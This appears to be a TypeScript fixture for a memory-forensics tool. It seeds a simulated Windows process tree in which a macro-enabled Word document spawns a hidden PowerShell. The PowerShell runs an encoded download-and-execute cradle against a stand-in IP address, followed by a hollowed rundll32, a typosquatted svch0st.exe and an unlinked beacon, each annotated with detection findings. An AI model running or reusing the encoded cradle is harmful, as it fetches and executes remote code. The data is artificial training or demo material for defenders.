import type { Finding, ProcessRow } from "../types";

const alert = (label: string, detail: string): Finding => ({ verdict: "alert", label, detail });
const notice = (label: string, detail: string): Finding => ({ verdict: "notice", label, detail });

interface Seed {
  d: number;
  pid: number;
  ppid: number;
  name: string;
  off: number;
  th: number;
  hnd: number | null;
  sess: number | null;
  created: string;
  exited?: string;
  cmd?: string;
  path?: string;
  wow64?: boolean;
  findings?: Finding[];
  listWalk?: boolean;
  poolScan?: boolean;
}

const SYS32 = "C:\\Windows\\System32\\";

const seeds: Seed[] = [
  { d: 0, pid: 4, ppid: 0, name: "System", off: 0x3f2a1040, th: 152, hnd: 3021, sess: null, created: "2026-08-05 08:12:03" },
  { d: 1, pid: 88, ppid: 4, name: "Registry", off: 0x3f4c2080, th: 4, hnd: 0, sess: null, created: "2026-08-05 08:12:01" },
  { d: 1, pid: 332, ppid: 4, name: "smss.exe", off: 0x41b83080, th: 2, hnd: 53, sess: null, created: "2026-08-05 08:12:04", path: SYS32 + "smss.exe" },
  { d: 1, pid: 1892, ppid: 4, name: "MemCompression", off: 0x5d117080, th: 38, hnd: 0, sess: null, created: "2026-08-05 08:12:38" },

  { d: 0, pid: 440, ppid: 424, name: "csrss.exe", off: 0x4210c140, th: 11, hnd: 246, sess: 0, created: "2026-08-05 08:12:07", path: SYS32 + "csrss.exe" },
  { d: 0, pid: 516, ppid: 424, name: "wininit.exe", off: 0x42891080, th: 1, hnd: 152, sess: 0, created: "2026-08-05 08:12:08", path: SYS32 + "wininit.exe" },
  { d: 1, pid: 628, ppid: 516, name: "services.exe", off: 0x43502080, th: 8, hnd: 291, sess: 0, created: "2026-08-05 08:12:09", path: SYS32 + "services.exe" },
  { d: 2, pid: 736, ppid: 628, name: "svchost.exe", off: 0x44118080, th: 22, hnd: 812, sess: 0, created: "2026-08-05 08:12:10", cmd: "svchost.exe -k DcomLaunch -p", path: SYS32 + "svchost.exe" },
  { d: 2, pid: 812, ppid: 628, name: "svchost.exe", off: 0x4419e080, th: 14, hnd: 447, sess: 0, created: "2026-08-05 08:12:11", cmd: "svchost.exe -k RPCSS -p", path: SYS32 + "svchost.exe" },
  { d: 2, pid: 964, ppid: 628, name: "svchost.exe", off: 0x45023080, th: 31, hnd: 1104, sess: 0, created: "2026-08-05 08:12:12", cmd: "svchost.exe -k netsvcs -p", path: SYS32 + "svchost.exe" },
  { d: 2, pid: 1044, ppid: 628, name: "svchost.exe", off: 0x450d4080, th: 9, hnd: 322, sess: 0, created: "2026-08-05 08:12:13", cmd: "svchost.exe -k LocalService -p", path: SYS32 + "svchost.exe" },
  { d: 2, pid: 1288, ppid: 628, name: "spoolsv.exe", off: 0x472a1080, th: 13, hnd: 388, sess: 0, created: "2026-08-05 08:12:22", path: SYS32 + "spoolsv.exe" },
  { d: 2, pid: 1704, ppid: 628, name: "MsMpEng.exe", off: 0x4d8b7080, th: 41, hnd: 936, sess: 0, created: "2026-08-05 08:12:29", path: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2207.7-0\\MsMpEng.exe" },
  { d: 2, pid: 2216, ppid: 628, name: "SearchIndexer.exe", off: 0x5e5a9080, th: 24, hnd: 761, sess: 0, created: "2026-08-05 08:13:02", path: SYS32 + "SearchIndexer.exe" },
  { d: 1, pid: 644, ppid: 516, name: "lsass.exe", off: 0x4359b080, th: 12, hnd: 1447, sess: 0, created: "2026-08-05 08:12:09", path: SYS32 + "lsass.exe" },
  { d: 1, pid: 748, ppid: 516, name: "fontdrvhost.exe", off: 0x4412c080, th: 5, hnd: 46, sess: 0, created: "2026-08-05 08:12:10", path: SYS32 + "fontdrvhost.exe" },

  { d: 0, pid: 532, ppid: 524, name: "csrss.exe", off: 0x42a44080, th: 14, hnd: 412, sess: 1, created: "2026-08-05 08:12:08", path: SYS32 + "csrss.exe" },
  { d: 0, pid: 604, ppid: 524, name: "winlogon.exe", off: 0x432f1080, th: 5, hnd: 231, sess: 1, created: "2026-08-05 08:12:09", path: SYS32 + "winlogon.exe" },
  { d: 1, pid: 756, ppid: 604, name: "fontdrvhost.exe", off: 0x44148080, th: 5, hnd: 46, sess: 1, created: "2026-08-05 08:12:10", path: SYS32 + "fontdrvhost.exe" },
  { d: 1, pid: 924, ppid: 604, name: "dwm.exe", off: 0x44fd1080, th: 17, hnd: 588, sess: 1, created: "2026-08-05 08:12:14", path: SYS32 + "dwm.exe" },
  { d: 1, pid: 2988, ppid: 604, name: "userinit.exe", off: 0x6dd12080, th: 0, hnd: null, sess: 1, created: "2026-08-05 08:14:41", exited: "2026-08-05 08:15:02", path: SYS32 + "userinit.exe" },

  { d: 2, pid: 3856, ppid: 2988, name: "explorer.exe", off: 0x7e2f6080, th: 63, hnd: 2214, sess: 1, created: "2026-08-05 08:14:44", path: "C:\\Windows\\explorer.exe", findings: [notice("Parent has exited", "userinit.exe (2988) exited at 08:15:02. Normal for a logon shell, listed so the tree is not misread.")] },

  { d: 3, pid: 4020, ppid: 3856, name: "OUTLOOK.EXE", off: 0x88b3a080, th: 34, hnd: 1502, sess: 1, created: "2026-08-05 08:16:11", path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" },
  { d: 3, pid: 2104, ppid: 3856, name: "chrome.exe", off: 0x9f012080, th: 41, hnd: 1188, sess: 1, created: "2026-08-05 08:21:37", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" },
  { d: 4, pid: 2340, ppid: 2104, name: "chrome.exe", off: 0x9f0b7080, th: 14, hnd: 302, sess: 1, created: "2026-08-05 08:21:38", cmd: "chrome.exe --type=gpu-process", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" },
  { d: 4, pid: 2412, ppid: 2104, name: "chrome.exe", off: 0x9f104080, th: 17, hnd: 288, sess: 1, created: "2026-08-05 08:21:39", cmd: "chrome.exe --type=renderer", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" },

  {
    d: 3, pid: 3012, ppid: 3856, name: "WINWORD.EXE", off: 0xb0a41080, th: 22, hnd: 894, sess: 1,
    created: "2026-08-05 09:41:22",
    cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\j.harper\\Downloads\\Invoice_0431.docm"',
    path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    findings: [notice("Macro-enabled document", "Opened Invoice_0431.docm from the Downloads folder 25 seconds before spawning a shell.")],
  },
  {
    d: 4, pid: 3204, ppid: 3012, name: "powershell.exe", off: 0xc0d92080, th: 16, hnd: 641, sess: 1,
    created: "2026-08-05 09:41:47",
    cmd: "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA",
    path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    findings: [
      alert("Office spawned a shell", "WINWORD.EXE (3012) is the parent. Word has no legitimate reason to launch PowerShell."),
      alert("Encoded command line", "-enc payload decodes to IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')."),
      notice("Execution policy bypassed", "-ep bypass combined with -w hidden and -nop."),
    ],
  },
  {
    d: 5, pid: 4188, ppid: 3204, name: "rundll32.exe", off: 0xd1338080, th: 9, hnd: 214, sess: 1,
    created: "2026-08-05 09:42:03",
    cmd: "rundll32.exe",
    path: SYS32 + "rundll32.exe",
    findings: [
      alert("Executable private memory", "0x1f0000 to 0x1f8fff is PAGE_EXECUTE_READWRITE, private, and has no backing file."),
      alert("No command line arguments", "rundll32.exe launched with no DLL or entry point. Consistent with a hollowed host."),
    ],
  },
  {
    d: 3, pid: 4412, ppid: 3856, name: "svch0st.exe", off: 0xe15c1080, th: 6, hnd: 118, sess: 1,
    created: "2026-08-05 09:42:19",
    cmd: "C:\\Users\\j.harper\\AppData\\Roaming\\svch0st.exe",
    path: "C:\\Users\\j.harper\\AppData\\Roaming\\svch0st.exe",
    findings: [
      alert("Name imitates a system binary", "svch0st.exe uses a zero in place of the letter o. The genuine binary is svchost.exe."),
      alert("Running from a user profile", "System binaries do not live in AppData\\Roaming."),
      notice("Unexpected parent", "explorer.exe is the parent. svchost.exe is normally a child of services.exe."),
    ],
  },
  {
    d: 0, pid: 5120, ppid: 4188, name: "beacon.exe", off: 0x11f04a080, th: 4, hnd: 87, sess: 1,
    created: "2026-08-05 09:42:51",
    cmd: "C:\\ProgramData\\Intel\\ShaderCache\\beacon.exe",
    path: "C:\\ProgramData\\Intel\\ShaderCache\\beacon.exe",
    listWalk: false,
    findings: [
      alert("Unlinked from the process list", "Recovered by psscan only. Absent from pslist, which walks ActiveProcessLinks."),
      alert("Masquerading directory", "ProgramData\\Intel\\ShaderCache is not an Intel path on this build."),
    ],
  },
];

export const processes: ProcessRow[] = seeds.map((s) => ({
  pid: s.pid,
  ppid: s.ppid,
  name: s.name,
  offset: s.off,
  threads: s.th,
  handles: s.hnd,
  sessionId: s.sess,
  wow64: s.wow64 ?? false,
  createTime: s.created,
  exitTime: s.exited ?? null,
  depth: s.d,
  cmdline: s.cmd ?? (s.path ? s.path : null),
  path: s.path ?? null,
  findings: s.findings ?? [],
  listWalkVisible: s.listWalk ?? true,
  poolScanVisible: s.poolScan ?? true,
}));

export const processByPid = new Map(processes.map((r) => [r.pid, r]));

export function verdictOf(findings: Finding[]): "alert" | "notice" | "clean" {
  if (findings.some((f) => f.verdict === "alert")) return "alert";
  if (findings.some((f) => f.verdict === "notice")) return "notice";
  return "clean";
}
